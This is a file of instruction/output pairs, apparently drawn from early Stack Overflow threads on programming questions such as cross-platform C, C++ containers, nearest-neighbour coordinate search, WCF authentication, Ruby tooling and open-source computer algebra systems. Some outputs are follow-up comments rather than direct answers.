{"instruction": "What things should be kept most in mind when writing cross-platform applications in C? Targeted platforms: 32-bit Intel based PC, Mac, and Linux. I'm especially looking for the type of versatility that Jungle Disk has in their USB desktop edition ( http://www.jungledisk.com/desktop/download.aspx )\nWhat are tips and \"gotchas\" for this type of development?", "output": "Try to write as much as you can with POSIX. Mac and Linux support POSIX natively and Windows has a system that can run it (as far as I know - I've never actually used it). If your app is graphical, both Mac and Linux support X11 libraries (Linux natively, Mac through X11.app)  and there are numerous ways of getting X11 apps to run on Windows.\nHowever, if you're looking for true multi-platform deployment, you should probably switch to a language like Java or Python that's capable of running the same program on multiple systems with little or no change.\nEdit: I just downloaded the application and looked at the files. It does appear to have binaries for all 3 platforms in one directory. If your concern is in how to write apps that can be moved from machine to machine without losing settings, you should probably write all your configuration to a file in the same directory as the executable and not touch the Windows registry or create any dot directories in the home folder of the user that's running the program on Linux or Mac. And as far as creating a cross-distribution Linux binary, 32-bit POSIX/X11 would probably be the safest bet. I'm not sure what JungleDisk uses as I'm currently on a Mac."}
{"instruction": "Is it possible to do image processing in silverlight 2.0?\nWhat I want to do is take an image, crop it, and then send the new cropped image up to the server.  I know I can fake it by clipping the image, but that only effects the rendering of the image.  I want to create a new image.\nAfter further research I have answered my own question. Answer: No.  Since all apis would be in System.Windows.Media.Imaging and that namespace does not have the appropriate classes in Silverlight\nI'm going to use fjcore.  http://code.google.com/p/fjcore/\nThanks Jonas", "output": "Well, you can actually do local image processing in Silverlight 2... But there are no built in classes to help you. But you can load any image into a byte array, and start manipulating it, or implement your own image encoder.\nJoe Stegman got lots of great information about \"editable images\" in Silverlight over at http://blogs.msdn.com/jstegman/.  He does things like applying filters to images, generating mandlebrots and more.\nThis blog discuss a JPEG Silverilght Encoder (FJCore) you can use to resize and recompress photos client size: http://fluxcapacity.net/2008/07/14/fjcore-to-the-rescue/\nAnother tool is \"Fluxify\" which lets you resize and upload photos using Silverilght 2. Can be found over at http://fluxtools.net/\nSo yes, client side image processing can definetly be done in Silverilght 2. Happy hacking!"}
{"instruction": "What things should be kept most in mind when writing cross-platform applications in C? Targeted platforms: 32-bit Intel based PC, Mac, and Linux. I'm especially looking for the type of versatility that Jungle Disk has in their USB desktop edition ( http://www.jungledisk.com/desktop/download.aspx )\nWhat are tips and \"gotchas\" for this type of development?", "output": "Further to Kyle's answer, I would strongly recommend against trying to use the Posix subsystem in Windows. It's implemented to an absolute bare minimum level such that Microsoft can claim \"Posix support\" on a feature sheet tick box. Perhaps somebody out there actually uses it, but I've never encountered it in real life.\nOne can certainly write cross-platform C code, you just have to be aware of the differences between platforms, and test, test, test. Unit tests and a CI (continuous integration) solution will go a long way toward making sure your program works across all your target platforms.\nA good approach is to isolate the system-dependent stuff in one or a few modules at most. Provide a system-independent interface from that module. Then build everything else on top of that module, so it doesn't depend on the system you're compiling for."}
{"instruction": "What things should be kept most in mind when writing cross-platform applications in C? Targeted platforms: 32-bit Intel based PC, Mac, and Linux. I'm especially looking for the type of versatility that Jungle Disk has in their USB desktop edition ( http://www.jungledisk.com/desktop/download.aspx )\nWhat are tips and \"gotchas\" for this type of development?", "output": "I maintained for a number of years an ANSI C networking library that was ported to close to 30 different OS's and compilers.  The library didn't have any GUI components, which made it easier.  We ended up abstracting out into dedicated source files any routine that was not consistent across platforms, and used #defines where appropriate in those source files.  This kept the code that was adjusted per platform isolated away from the main business logic of the library.  We also made extensive use of typedefs and our own dedicated types so that we could easily change them per platform if needed.  This made the port to 64-bit platforms fairly easy.\nIf you are looking to have GUI components, I would suggest looking at GUI toolkits such as WxWindows or Qt (which are both C++ libraries)."}
{"instruction": "I am ready to start using SVN, but I have NO (as in the money required for free beer) experience with source control.  I have installed subversion on my server (that was easy, 'apt-get install subversion') but now I don't know what to do, how to configure it, or how to use it.What suggestions do you have, and where can I find good resources to learn to start using it?\nUpdate:\nO.K. So the feedback has been great and I have read through a bit of it but I want to clarify my question by saying that I am looking for more information on how to actually go about setting my up my repositories, clients, server, etc.  I know that I could do a quick Google search and find dozens (or more) resources but I'm hoping that someone whom has experience with subversion and a client(I have installed tortoise) could suggest a good reference that will be reliable, and have quality content.", "output": "Another route you could take is not to mess around with your own repository per se, for fear of messing things up, but you could use someone else's repository or set up your own elsewhere. Point being, I learned by using SourceForge, which has both CVS and SVN... but hearing good things about SVN and weighing the differences between the two, I of course went with SVN. Getting back to SourceForge, I applied for a test project, more or less to see how SourceForge worked... but once I was in I got to playing around with their SVN for my own project listed there; experimenting with it both remotely and locally. Once I got a broad grasp of its features through testing it there, I then went on to read the go-to book for SVN, the freely distributed book by the tool's authors(the book already mentioned). It's truly a great book and at that point I began to feel comfortable setting up my own repository on critical systems. From that point all you need is a Q&A site like this for specific issues you come across and of course keep the free SVN book referenced in a bookmark for easy access. \nPost your questions if you get stuck along the way and we'll be happy to help. Best of luck!"}
{"instruction": "What things should be kept most in mind when writing cross-platform applications in C? Targeted platforms: 32-bit Intel based PC, Mac, and Linux. I'm especially looking for the type of versatility that Jungle Disk has in their USB desktop edition ( http://www.jungledisk.com/desktop/download.aspx )\nWhat are tips and \"gotchas\" for this type of development?", "output": "Try to avoid platform-dependent #ifdefs, as they tend to grow exponentially when you add new platforms. Instead, try to organize your source files as a tree with platform-independent code at the root, and platform-dependent code on the \"leaves\". There is a nice book on the subject, Multi-Platform Code Management. Sample code in it may look obsolete, but ideas described in the book are still brilliantly vital."}
{"instruction": "I'm trying to fully understand all of Haskell's concepts.\nIn what ways are algebraic data types similar to generic types, e.g., in C# and Java? And how are they different? What's so algebraic about them anyway? \nI'm familiar with universal algebra and its rings and fields, but I only have a vague idea of how Haskell's types work.", "output": "@Timbo:\nYou are basically right about it being sort of like an abstract Tree class with three derived classes (Empty, Leaf, and Node), but you would also need to enforce the guarantee that some one using your Tree class can never add any new derived classes, since the strategy for using the Tree datat type is to write code that switches at runtime based on the type of each element in the tree (and adding new derived types would break existing code). You can sort of imagine this getting nasty in C# or C++, but in Haskell, ML, and OCaml, this is central to the language design and syntax so coding style supports it in a much more convenient manner, via pattern matching.\nADT (sum types) are also sort of like tagged unions or variant types in C or C++."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "Yea FogBugz is great for process-light, quick and easy task management.  It seems especially well suited for soloing, where you don't need or want a lot of complexity in that area.  \nBy the way, if you want to keep track of what you're doing at the computer all day, check out TimeSprite, which integrates with FogBugz.  It's a Windows app that logs your active window and then categorizes your activity based on the window title / activity type mappings you define as you go.  (You can also just tell it what you're working on.)  And if you're a FogBugz user, you can associate your work with a FogBugz case, and it will upload your time intervals for that case.  This makes accurate recording of elapsed time pretty painless and about as accurate as you can get, which in turn improves FogBugz predictive powers in its evidence-based scheduling.  Also, when soloing, I find that such specific logging of my time keeps me on task, in the way a meandering manager otherwise might. (I'm not affiliated with TimeSprite in any way.)"}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "You will want to use a geometric construction called a Voronoi diagram. This divides up the plane into a number of areas, one for each point, that encompass all the points that are closest to each of your given points.\nThe code for the exact algorithms to create the Voronoi diagram and arrange the data structure lookups are too large to fit in this little edit box. :)\n@Linor: That's essentially what you would do after creating a Voronoi diagram. But instead of making a rectangular grid, you can choose dividing lines that closely match the lines of the Voronoi diagram (this way you will get fewer areas that cross dividing lines). If you recursively divide your Voronoi diagram in half along the best dividing line for each subdiagram, you can then do a tree search for each point you want to look up. This requires a bit of work up front but saves time later. Each lookup would be on the order of log N where N is the number of points. 16 comparisons is a lot better than 15,000!"}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "Even if you create a voronoi diagram, that still means you need to compare your x, y coordinates to all 15 thousand created areas. To make that easier, the first thing that popped into my mind though was to create some sort of grid over the possible values, so that you can easily place and x/y coordinate into one of the boxes in a grid, if the same is done for the list of areas you should quickly shrink the possible candidates for comparison (because the grid would be more rectangular, it's possible for an area to be in multiple grid positions)."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "The general concept you're describing is nearest-neighbour search, and there are a whole raft of techniques which deal with solving these types of queries, either exactly or approximately. The basic idea is to use a spatial partitioning technique to reduce the complexity from O(n) per query to (approximately) O( log n ) per query.\nKD-Trees, and variants of KD-Trees seem to work very well, but quad-trees will also work. The quality of these searches depends on whether your set of 15,000 data points are static (you're not adding a-lot of data points to the reference set). Mount and Arya's work on the Approximate Nearest Neighbour library is both easy to use and understand, even without a good grounding in the math. It also gives you some flexibility in the types and tolerances of your queries."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "Premature optimization is the root of all evil.\n15K coordinates aren't that much. Why not iterate over the 15K coordinates and see if that's really a performance problem? You could save a lot of work and maybe it never gets too slow to even notice."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "You didn't specify what you meant by fastest.  If you want to get the answer quickly without writing any code, I would give the gpsbabel radius filter a go."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "It rather depends how many times you want to do it, and what resources are available - if you're doing the test once, then the O(log N) techniques are good. If you're doing it a thousand times on a server, constructing a bitmap lookup table would be faster, either giving the result directly or as a first stage of. 2GB of bitmap can map the whole world lat-lon to a 32bit value at 0.011 degree pixels (1.2km at equator), and should fit into memory. If you're only doing single country, or can exclude the poles, you can have a smaller map or higher resolution. For 15,000 points you probably have a much smaller map - I first sized it up as a first step to doing lat-lon to postcode searches, which needs higher resolution. Depending on requirements, you use the mapped value to point at the result directly, or to short list of the candidates (which would allow a smaller map, but requires greater subsequent processing - you're not in O(1) lookup territory any more)."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "I did this once for a web site.  I.e. find the dealer within 50 miles of your zip code.  I used the great circle calculation to find the coordinates that were 50 miles north, 50 miles east, 50 miles south, and 50 miles west.  That gave me a min and max lat and a min and max long.  From there then I did a database query: \nselect *\n    from dealers\n    where latitude  >= minlat\n      and latitude  <= maxlat\n      and longitude >= minlong\n      and longitude <= maxlong\n\nSince some of those results will still be more than 50 miles away, then I used the great circle formula once more on that small list of coordinates.  Then I printed out the list along with the distance from the target.\nOf course, if you wanted to search for points near the international date line or the poles, than this won't work.  But it works great for searches inside North America!"}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "I think that an unordered_map and hash_map are more or less the same thing. The difference is that the STL doesn't officially have a hash_map (what you're using is probably a compiler specific thing), so unordered_map is the fix for that omission.\nunordered_map is just that... unordered. You can't depend on it preserving any ordering on iteration."}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "@wesc: STL has std::map... so what's the difference with unordered_map? I don't think STL would implement twice the same thing and call it differently."}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "This page may help, it reviews quite a few C++ unit test frameworks:\n\nCppUnit  \nBoost.Test\nCppUnitLite \nNanoCppUnit\nUnit++\nCxxTest\n\nCheck out CPPUnitLite or CPPUnitLite2. \nCPPUnitLite was created by Michael Feathers, who originally ported Java's JUnit to C++ as CPPUnit (CPPUnit tries mimic the development model of JUnit - but C++ lacks Java's features [e.g. reflection] to make it easy to use). \nCPPUnitLite attempts to make a true C++-style testing framework, not a Java one ported to C++. (I'm paraphrasing from Feather's Working Effectively with Legacy Code book). CPPUnitLite2 seems to be another rewrite, with more features and bug fixes.\nI also just stumbled across UnitTest++ which includes stuff from CPPUnitLite2 and some other framework.\nMicrosoft has released WinUnit. \nAlso checkout Catch or Doctest"}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "Boost documentation of unordered containers\nThe difference is in the method of how you generate the look up.\nIn the map/set containers the operator< is used to generate an ordered tree.\nIn the unordered containers, an operator( key ) => index is used.\nSee hashing for a description of how that works."}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "You sure that std::hash_map exists in all STL implementations? SGI STL implements it, however GNU g++ doesn't have it (it's located in the __gnu_cxx namespace) as of 4.3.1 anyway. As far as I know, hash_map has always been non-standard, and now tr1 is fixing that."}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "Sorry, read your last comment wrong. Yes, hash_map is not in STL, map is. But unordered_map and hash_map are the same from what I've been reading.\nmap -> log (n) insertion, retrieval, iteration is efficient (and ordered by key comparison)\nhash_map/unordered_map -> constant time insertion and retrieval, iteration time is not guarantee to be efficient\nNeither of these will work for you by themselves, since the map orders things based on the key content, and not the insertion sequence (unless your key contains info about the insertion sequence in it).\nYou'll have to do either what you described (list + hash_map), or create a key type that has the insertion sequence number plus an appropriate comparison function."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "How large an area are these coordinates spread out over?  What latitude are they at?  How much accuracy do you require?  If they're fairly close together, you can probably ignore the fact that the earth is round and just treat this as a Cartesian plane rather than messing about with spherical geometry and great circle distances.  Of course, as you get further from the equator, degrees of longitute get smaller compared to degrees of latitude, so some sort of scaling factor may be appropriate. \nStart with a fairly simple distance formula and a brute force search and see how long that's going to take and if the results are accurate enough before you get fancy."}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "You need to index an associative container two ways:\n\nInsertion order\nString comparison\n\nTry Boost.MultiIndex or Boost.Intrusive.  I haven't used it this way but I think it's possible."}
{"instruction": "I need an associative container that makes me index a certain object through a string, but that also keeps the order of insertion, so I can look for a specific object by its name or just iterate on it and retrieve objects in the same order I inserted them.\nI think this hybrid of linked list and hash map should do the job, but before I tried to use std::tr1::unordered_map thinking that it was working in that way I described, but it wasn't. So could someone explain me the meaning and behavior of unordered_map?\n\n@wesc: I'm sure std::map is implemented by STL, while I'm sure std::hash_map is NOT in the STL (I think older version of Visual Studio put it in a namespace called stdext).\n@cristopher: so, if I get it right, the difference is in the implementation (and thus performances), not in the way it behaves externally.", "output": "You've asked for the canonical reason why Boost::MultiIndex was made:  list insertion order with fast lookup by key.  Boost MultiIndex tutorial: list fast lookup"}
{"instruction": "I'm developing a web app on Yaws 1.65 (installed through apt) running on Debian etch on a VPS with UML.  Whenever I do /etc/init.d/yaws restart or a stop/start, it initializes according to an old version of the config file (/etc/yaws/yaws.conf).\nI know this because I changed the docroot from the default to another directory (call it A), then a few weeks later changed it to directory B, and the config file has stayed with B for the last several months.  But then, after a restart, it switches back to A.  If it switched back to the package default, that would be understandable, but it switches to an old customized version instead.\nThe funny thing is that if I leave it stopped for several minutes, when I start it again, everything switches back to normal (using directory B).  But while it's stopped, if I run ps, I don't see any yaws-related processes (yaws, heart, etc).  This problem has survived several reboots, so it's got to be an old cached copy of the config somewhere, but I have yet to find anything like that.\nAny idea what could be going on?\nUpdate:\n@Gorgapor - I stopped yaws, renamed the config file and tried to start it again.  It failed to start.  However, I was able to restart a couple of times and this time it didn't switch back to the old version.", "output": "I'm completely inexperienced with yaws, but I have a troubleshooting suggestion: What happens if you remove the config file completely? If it still starts yaws without a config file, that could be a clear sign that something is being cached.\nFor what it's worth, with a quick 5 minutes of googling, I found no mention of any caching behavior."}
{"instruction": "Hy, does anyone worked with N2 Content Management System(http://www.codeplex.com/n2).\nIf yes, how does it perform, performance wise(under heavy load)?\nIt seems pretty simple and easy to use.\nAdrian", "output": "I tried it and it looked promising at first but quickly had issues actually deploying it to a Medium Trust host."}
{"instruction": "I'm looking to push my domain model into a WCF Service API and wanted to get some thoughts on lazy loading techniques with this type of setup.\nAny suggestions when taking this approach?\n\nwhen I implemented this technique and step into my app, just before the server returns my list it hits the get of each property that is supposed to be lazy loaded ... Thus eager loading. Could you explain this issue or suggest a resolution?\nEdit:  It appears you can use the XMLIgnore attribute so it doesn\u2019t get looked at during serialization .. still reading up on this though", "output": "As for any remoting architecture, you'll want to avoid loading a full object graph \"down the wire\" in an uncontrolled way (unless you have a trivially small number of objects).\nThe Wikipedia article has the standard techniques pretty much summarised (and in C#. too!). I've used both ghosts and value holders and they work pretty well.\nTo implement this kind of technique, make sure that you separate concerns strictly. On the server, your service contract implementation classes should be the only bits of the code that work with data contracts. On the client, the service access layer should be the only code that works with the proxies. \nLayering like this lets you adjust the way that the service is implemented relatively independently of the UI layers calling the service and the business tier that's being called. It also gives you half a chance of unit testing!"}
{"instruction": "I have a method which takes params object[] such as:\nvoid Foo(params object[] items)\n{\n    Console.WriteLine(items[0]);\n}\n\nWhen I pass two object arrays to this method, it works fine:\nFoo(new object[]{ (object)\"1\", (object)\"2\" }, new object[]{ (object)\"3\", (object)\"4\" } );\n// Output: System.Object[]\n\nBut when I pass a single object[], it does not take my object[] as the first param, instead it takes its all elements like I wanted to pass them one by one:\nFoo(new object[]{ (object)\"1\", (object)\"2\" });\n// Output: 1, expected: System.Object[]\n\nHow do I pass a single object[] as a first argument to a params array?", "output": "You need to encapsulate it into another object[] array, like this:\nFoo(new Object[] { new object[]{ (object)\"1\", (object)\"2\" }});"}
{"instruction": "I have a method which takes params object[] such as:\nvoid Foo(params object[] items)\n{\n    Console.WriteLine(items[0]);\n}\n\nWhen I pass two object arrays to this method, it works fine:\nFoo(new object[]{ (object)\"1\", (object)\"2\" }, new object[]{ (object)\"3\", (object)\"4\" } );\n// Output: System.Object[]\n\nBut when I pass a single object[], it does not take my object[] as the first param, instead it takes its all elements like I wanted to pass them one by one:\nFoo(new object[]{ (object)\"1\", (object)\"2\" });\n// Output: 1, expected: System.Object[]\n\nHow do I pass a single object[] as a first argument to a params array?", "output": "One option is you can wrap it into another array:\nFoo(new object[]{ new object[]{ (object)\"1\", (object)\"2\" } });\n\nKind of ugly, but since each item is an array, you can't just cast it to make the problem go away... such as if it were Foo(params object items), then you could just do:\nFoo((object) new object[]{ (object)\"1\", (object)\"2\" });\n\nAlternatively, you could try defining another overloaded instance of Foo which takes just a single array:\nvoid Foo(object[] item)\n{\n    // Somehow don't duplicate Foo(object[]) and\n    // Foo(params object[]) without making an infinite\n    // recursive call... maybe something like\n    // FooImpl(params object[] items) and then this\n    // could invoke it via:\n    // FooImpl(new object[] { item });\n}"}
{"instruction": "I have a method which takes params object[] such as:\nvoid Foo(params object[] items)\n{\n    Console.WriteLine(items[0]);\n}\n\nWhen I pass two object arrays to this method, it works fine:\nFoo(new object[]{ (object)\"1\", (object)\"2\" }, new object[]{ (object)\"3\", (object)\"4\" } );\n// Output: System.Object[]\n\nBut when I pass a single object[], it does not take my object[] as the first param, instead it takes its all elements like I wanted to pass them one by one:\nFoo(new object[]{ (object)\"1\", (object)\"2\" });\n// Output: 1, expected: System.Object[]\n\nHow do I pass a single object[] as a first argument to a params array?", "output": "A simple typecast will ensure the compiler knows what you mean in this case.\nFoo((object)new object[]{ (object)\"1\", (object)\"2\" }));\n\nAs an array is a subtype of object, this all works out. Bit of an odd solution though, I'll agree.\nEdit: Woops, typoed my example code."}
{"instruction": "I'm currently learning F# quite intensively. I really love it as a language, it just sort of 'feels' right and seems to allow you to produce some succint elegant code.\nI'm interested in finding some really nice 'wow factor' snippets of F# code which demonstate the elegence of the language, especially compared to C#. For example I really like:-\n\n#light\nlet ListProduct l = List.fold_left (*) 1 l\n\nWhich inputs a list of ints and multiplies each element in the list, i.e. obtains the product of the list (e.g. a list of 1,2,3 would be calculated as 1*2*3=6). The closest C# equivilent, using LINQ and functional concepts is as follows:-\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n...\n\npublic static class ListHelper {\n  public static int ListProduct(List<int> l) {\n    return l.Aggregate(1, (i, j) => i * j);\n  }\n}    \n\nBefore LINQ that would have been:-\nusing System;\nusing System.Collections.Generic;\n\n...\n\npublic static class ListHelper {\n  public static int ListProduct(List<int> l) {\n    int ret = 1;\n    foreach (int i in l) ret *= i;\n    return ret;\n  }\n}\n\nI'm certainly not trying to criticise C# here, I think it's a wonderful language, it's just nice to see how F# compares and to see how it can do some things more elegantly - does anyone have anything really nice?", "output": "F# is a functional programming language and therefore is great with lists and recursion.  \nThe code below, is a slight modification to part of the default tutorial F# Project included with the F# download package.  It is nothing special but demonstrates the same code as you put above for those that are wondering. \nlet rec ListProduct xs =\n    match xs with\n    //If xs is an empty list, we have a match with an empty list.  Return 1\n    | []    -> 1\n    //Otherwise match with an item + the rest of the list.  \n    //Return the first item * the rest of the list. \n    | y::ys -> y * ListProduct ys\n\nThis code is obviously not meant to give any wow factor as you mentioned.  But you can see some really cool uses of F# on this site.  Check out the sudoku solver in F#.  Compare this code to a C# implementation of a Sudoku solver.  The site also demonstrates how to easily code a GUI with F#.\nThis site will show you how to integrate F# with ASP .Net"}
{"instruction": "What is the best approach to make sure you only need to authenticate once when using an API built on WCF?\nMy current bindings and behaviors are listed below\n\t<bindings>\n\t\t<wsHttpBinding>\n\t\t\t<binding name=\"wsHttp\">\n\t\t\t\t<security mode=\"TransportWithMessageCredential\">\n\t\t\t\t\t<transport/>\n\t\t\t\t\t<message clientCredentialType=\"UserName\" negotiateServiceCredential=\"false\" establishSecurityContext=\"true\"/>\n\t\t\t\t</security>\n\t\t\t</binding>\n\t\t</wsHttpBinding>\n\t</bindings>\n\t<behaviors>\n\t\t<serviceBehaviors>\n\t\t\t<behavior name=\"NorthwindBehavior\">\n\t\t\t\t<serviceMetadata httpGetEnabled=\"true\"/>\n\t\t\t\t<serviceAuthorization principalPermissionMode=\"UseAspNetRoles\"/>\n\t\t\t\t<serviceCredentials>\n\t\t\t\t\t<userNameAuthentication userNamePasswordValidationMode=\"MembershipProvider\"/>\n\t\t\t\t</serviceCredentials>\n\t\t\t</behavior>\n\t\t</serviceBehaviors>\n\t</behaviors>\n\nNext is what I am using in my client app to authenticate (currently I must do this everytime I want to make a call into WCF)\nDim client As ProductServiceClient = New ProductServiceClient(\"wsHttpProductService\")\nclient.ClientCredentials.UserName.UserName = \"foo\"\nclient.ClientCredentials.UserName.Password = \"bar\"\nDim ProductList As List(Of Product) = client.GetProducts()\n\nWhat I would like to do is auth w/ the API once using these credentials, then get some type of token for the period of time my client application is using the web service project.  I thought establishsecuritycontext=true did this for me?", "output": "If you're on an intranet, Windows authentication can be handled for \"free\" by configuration alone. \nIf this isn't appropriate, token services work just fine, but for some situations they may be just too much.\nThe application I'm working on needed bare-bones authentication. Our server and client run inside a (very secure) intranet, so we didn't care too much for the requirement to use an X.509 certificate to encrypt the communication, which is required if you're using username authentication.\nSo we added a custom behavior to the client that adds the username and (encrypted) password to the message headers, and another custom behavior on the server that verifies them.\nAll very simple, required no changes to the client side service access layer or the service contract implementation. And as it's all done by configuration, if and when we need to move to something a little stronger it'll be easy to migrate."}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "Check out \"Writing Efficient Ruby Code\" from Addison Wesley Professional:\nhttp://safari.oreilly.com/9780321540034\nI found some very helpful and interesting insights in this short work. And if you sign up for the free 10-day trial you could read it for free. (It's 50 pages and the trial gets you (AFAIR) 100 page views.)\nhttps://ssl.safaribooksonline.com/promo"}
{"instruction": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.", "output": "By Ruby commands you probably mean the command line programs for Ruby.  These are also called Ruby Helper programs.  Here are a few:\n\nruby - The interpreter itself.  Run Ruby scripts or statements.\ngem - Ruby Package Manager.  Great for automatically downloading or updating small Ruby modules like XML libraries, web servers, or even whole Ruby programs.\nirb - Interactive Ruby Prompt.  This is an entire Ruby shell that will let you execute any Ruby code you want.  You can load libraries, test code directly, anything you can do with Ruby you can do in this shell.  Believe me, there is quite a lot that you can do with it to improve your Ruby development workflow [1].\nri - Quick shell access to Ruby documentation.  You can find the RDoc information on nearly any Ruby Class or method.  The same kind of documentation that you would find on the online ruby-docs.\nerb - Evaluates embedded Ruby in Ruby Templated documents.  Embedded Ruby is just like embedding php into a document, and this is an interpreter for that kind of document.  This is really more for the rails crowd.  An alternative would be haml.\nrdoc - Generate the standard Ruby documentation for one of your Ruby classes.  Its like Javadocs.  It parses the Ruby source files and generates the standard documentation from special comments.\ntestrb and rake.  I'm not familiar enough with these.  I'd love it if someone could fill these in!\n\nHopefully this was what you were looking for!"}
{"instruction": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.", "output": "sudo gem install gemname\nsudo gem update gemname"}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "SAGE is definitely one you should consider since it actually includes the full version of Maxima within it (along with interfaces to various other mathematical packages).  To answer your questions:\n1) SAGE can symbolically differentiate and integrate.\n2) Programming in SAGE is done via Python.\n3) The syntax is rather different to Mathematica's (which is essentially LISP-like) but here is a blog post written by a heavy user of Mathematica so you can see what he thinks: Walking Randomly: Interacting with SAGE"}
{"instruction": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.", "output": "@John Topley: Thanks. Is there a\n  similar command to update Ruby itself?\n\nNot really. You don't say which operating system you're using. I use Mac OS X and tend to build Ruby from source."}
